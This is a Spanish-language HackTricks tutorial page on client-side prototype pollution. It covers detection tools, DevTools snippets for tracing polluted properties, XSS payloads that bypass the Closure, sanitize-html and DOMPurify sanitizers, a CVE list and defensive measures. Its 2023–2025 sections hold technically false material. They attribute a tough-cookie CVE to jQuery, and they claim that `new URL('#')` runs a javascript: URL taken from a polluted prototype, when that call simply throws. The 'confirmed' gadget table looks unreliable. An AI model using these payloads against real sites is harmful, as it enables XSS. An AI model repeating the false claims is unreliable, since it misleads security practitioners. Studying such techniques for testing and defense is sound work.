# Contaminación de Prototipos del Lado del Cliente

{{#include ../../../banners/hacktricks-training.md}}

## Descubriendo usando herramientas automáticas

Las herramientas [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **y** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) se pueden usar para **encontrar vulnerabilidades de contaminación de prototipos**.

Además, también podrías usar la **extensión del navegador** [**PPScan**](https://github.com/msrkp/PPScan) para **escanear automáticamente** las **páginas** que **accedes** en busca de vulnerabilidades de contaminación de prototipos.

### Depurando dónde se usa una propiedad <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Encontrar la causa raíz de la contaminación del prototipo <a href="#id-5530" id="id-5530"></a>

Una vez que se ha identificado una vulnerabilidad de contaminación del prototipo mediante cualquiera de las herramientas, y si el código no es demasiado complejo, puedes encontrar la vulnerabilidad buscando palabras clave como `location.hash`, `decodeURIComponent` o `location.search` en las Herramientas de Desarrollo de Chrome. Este enfoque te permite localizar la sección vulnerable del código JavaScript.

Para bases de código más grandes y complejas, un método sencillo para descubrir el código vulnerable implica los siguientes pasos:

1. Usa una herramienta para identificar una vulnerabilidad y obtener una carga útil diseñada para establecer una propiedad en el constructor. Un ejemplo proporcionado por ppmap podría verse así: `constructor[prototype][ppmap]=reserved`.
2. Establece un punto de interrupción en la primera línea de código JavaScript que se ejecutará en la página. Actualiza la página con la carga útil, pausando la ejecución en este punto de interrupción.
3. Mientras la ejecución de JavaScript está en pausa, ejecuta el siguiente script en la consola de JS. Este script señalará cuándo se crea la propiedad 'ppmap', ayudando a localizar su origen:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Navega de vuelta a la pestaña **Sources** y selecciona “Resume script execution”. El JavaScript continuará ejecutándose, y la propiedad 'ppmap' se contaminará como se esperaba. Utilizar el fragmento proporcionado facilita la identificación de la ubicación exacta donde se contamina la propiedad 'ppmap'. Al examinar la **Call Stack**, se pueden observar diferentes pilas donde ocurrió la contaminación.

Al decidir qué pila investigar, a menudo es útil dirigirse a pilas asociadas con archivos de bibliotecas de JavaScript, ya que la contaminación del prototipo ocurre con frecuencia dentro de estas bibliotecas. Identifica la pila relevante examinando su conexión a archivos de biblioteca (visible en el lado derecho, similar a una imagen proporcionada como guía). En escenarios con múltiples pilas, como las de las líneas 4 y 6, la elección lógica es la pila de la línea 4, ya que representa la primera ocurrencia de contaminación y, por lo tanto, la causa raíz de la vulnerabilidad. Hacer clic en la pila te llevará al código vulnerable.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Encontrar Gadgets de Script

El gadget es el **código que será abusado una vez que se descubra una vulnerabilidad de PP**.

Si la aplicación es simple, podemos **buscar** palabras clave como **`srcdoc/innerHTML/iframe/createElement`** y revisar el código fuente y verificar si **conduce a la ejecución de javascript**. A veces, las técnicas mencionadas pueden no encontrar gadgets en absoluto. En ese caso, una revisión pura del código fuente revela algunos buenos gadgets como el siguiente ejemplo.

### Ejemplo de encontrar gadget de PP en el código de la biblioteca Mithil

Consulta este informe: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilación de payloads para bibliotecas vulnerables

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass de HTML Sanitizers a través de PP

[**Esta investigación**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) muestra gadgets de PP para usar para **eludir las sanitizaciones** proporcionadas por algunas bibliotecas de sanitizadores HTML:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Nuevas Herramientas y Automatización (2023–2025)

* **Burp Suite DOM Invader (v2023.6)** – PortSwigger agregó una pestaña dedicada a *Prototype-pollution* que muta automáticamente los nombres de los parámetros (por ejemplo, `__proto__`, `constructor.prototype`) y detecta propiedades contaminadas en puntos de sink dentro de la extensión del navegador. Cuando se activa un gadget, DOM Invader muestra la pila de ejecución y la línea exacta donde se desreferenció la propiedad, haciendo innecesaria la búsqueda manual de puntos de interrupción. Combínalo con el fragmento "Break on property access" ya mostrado arriba para pivotar rápidamente de *source → sink*.
* **protoStalker** – un complemento de Chrome DevTools de código abierto (lanzado en 2024) que visualiza cadenas de prototipos en tiempo real y señala escrituras a claves globalmente peligrosas como `onerror`, `innerHTML`, `srcdoc`, `id`, etc. Útil cuando solo tienes un paquete de producción y no puedes instrumentar el paso de construcción.
* **ppfuzz 2.0 (2025)** – la herramienta ahora soporta ES-modules, HTTP/2 y puntos finales de WebSocket. El nuevo modo `-A browser` inicia una instancia de Chromium sin cabeza y enumera automáticamente las clases de gadgets forzando APIs de DOM (ver sección a continuación).

---

## Investigación Reciente sobre Gadgets de Prototype-Pollution (2022–2025)

A mediados de 2023, los investigadores de PortSwigger publicaron un artículo que muestra que los objetos *integrados en el navegador* pueden convertirse en gadgets XSS confiables una vez contaminados. Debido a que estos objetos están presentes en **todas** las páginas, puedes obtener ejecución incluso si el código de la aplicación objetivo nunca toca la propiedad contaminada.

Ejemplo de gadget (funciona en todos los navegadores evergreen ≥ 2023-04):
```html
<script>
// Source (e.g. https://victim/?__proto__[href]=javascript:alert(document.domain))
// For demo we just pollute manually:
Object.prototype.href = 'javascript:alert(`polluted`)' ;

// Sink – URL() constructor implicitly reads `href`
new URL('#'); // breaks into JS; in Chrome you get an alert, Firefox loads "javascript:" URL
</script>
```
Otros gadgets globales útiles que se han confirmado que funcionan después de la contaminación (probado en 2024-11):

| Clase de gadget | Propiedad leída | Primitivo logrado |
|------------------|------------------|--------------------|
| `Notification` | `title` | `alert()` a través del clic en la notificación |
| `Worker` | `name` | Ejecución de JS en Worker dedicado |
| `Image` | `src` | XSS tradicional `onerror` |
| `URLSearchParams` | `toString` | Redirección abierta basada en DOM |

Consulta el documento de PortSwigger para la lista completa de 11 gadgets y una discusión sobre escapes de sandbox.

---

## CVEs Notables de PP del Lado del Cliente (2023-2025)

* **DOMPurify ≤ 3.0.8 – CVE-2024-45801**  Un atacante podría contaminar `Node.prototype.after` antes de que se inicializara el saneador, eludiendo el perfil *SAFE_FOR_TEMPLATES* y llevando a XSS almacenado. El proveedor corrigió utilizando verificaciones `Object.hasOwn()` y `Object.create(null)` para mapas internos.
* **jQuery 3.6.0-3.6.3 – CVE-2023-26136 / CVE-2023-26140**  `extend()` podría usarse en objetos manipulados que provienen de `location.hash`, introduciendo propiedades arbitrarias en `Object.prototype` en el contexto de navegación.
* **sanitize-html < 2.8.1 (2023-10) contaminación de prototipos**  Una lista de atributos maliciosa como `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` eludió la lista de permitidos.

Incluso si la biblioteca vulnerable vive **solo en el cliente**, el XSS resultante sigue siendo explotable de forma remota a través de parámetros reflejados, controladores de postMessage o datos almacenados que se renderizan más tarde.

---

## Medidas Defensivas Modernas

1. **Congelar el prototipo global temprano** (idealmente como el primer script):
```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```
Ten en cuenta que esto podría romper polyfills que dependen de extensiones tardías.
2. Usa `structuredClone()` en lugar de `JSON.parse(JSON.stringify(obj))` o fragmentos de "deepMerge" de la comunidad: ignora setters/getters y no recorre la cadena de prototipos.
3. Cuando realmente necesites funcionalidad de fusión profunda, elige **lodash ≥ 4.17.22** o **deepmerge ≥ 5.3.0** que tienen saneamiento de prototipos incorporado.
4. Agrega una Content-Security-Policy con `script-src 'self'` y un nonce estricto. Aunque CSP no detendrá todos los gadgets (por ejemplo, manipulación de `location`), bloquea la mayoría de los sumideros de `innerHTML`.

## Referencias

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [https://portswigger.net/research/widespread-prototype-pollution-gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
